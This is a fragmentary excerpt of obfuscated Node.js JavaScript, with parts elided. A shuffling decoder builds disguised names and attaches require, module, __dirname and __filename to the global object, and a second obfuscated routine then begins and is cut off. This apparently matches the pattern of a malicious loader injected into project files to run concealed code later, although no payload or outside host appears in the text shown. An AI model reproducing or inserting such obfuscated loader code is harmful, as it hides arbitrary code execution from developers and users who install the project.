...
var _$_58e5 = (function (m, u) {
    ...
    for (var j = 0; j < g; j++) {
        var z = u * (j + 82) + (u % 45863)
        var e = u * (j + 637) + (u % 29491)
        var h = z % g
        var k = e % g
        var d = c[h]
        c[h] = c[k]
    ...
    var q = '\x23\x30'
    var v = '\x23'
    return c.join(r).split(n).join(w).split(p).join(i).split(q).join(v).split(w)
})('emi_jm_edn%u%nfeni_roba__da_%ien%%emrledfct', 2913010)
global[_$_58e5[0x0]] = require
if (typeof module === _$_58e5[0x1]) {
    global[_$_58e5[0x2]] = module
}
if (typeof __dirname !== _$_58e5[0x3]) {
    global[_$_58e5[0x4]] = __dirname
}
if (typeof __filename !== _$_58e5[0x3]) {
    global[_$_58e5[0x5]] = __filename
}
var _$jsoToArr
;(function () {
    var jjG = '',
    ...
    function bLU(j) {
        ...
        for (var z = 0; z < u; z++) {
            var s = g * (z + 143) + (g % 19013)
            var e = g * (z + 207) + (g % 13818)
            var v = s % u
            var a = e % u
            var c = q[v]
            q[v] = q[a]
